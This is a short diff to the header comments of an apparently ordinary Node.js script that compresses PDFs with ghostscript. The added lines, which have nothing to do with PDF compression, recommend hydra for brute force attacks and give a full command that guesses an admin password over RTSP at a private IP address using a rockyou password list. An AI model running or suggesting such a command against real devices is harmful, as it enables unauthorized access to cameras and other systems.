@@ -1,4 +1,8 @@
 // you need linux or wsl for this script
+
+// for brute force attack you can use hydra tool, install it with sudo apt install hydra
+// hydra -l admin -P rockyou-top100.txt rtsp://192.168.29.78
+
 // install: sudo apt install ghostscript
 //maks sure you have all pdf in one folder and run this script with
 //  node compress.js <input_folder> <output_folder> <quality>  eg. node compress.js ./pdfs ./compressed ebook
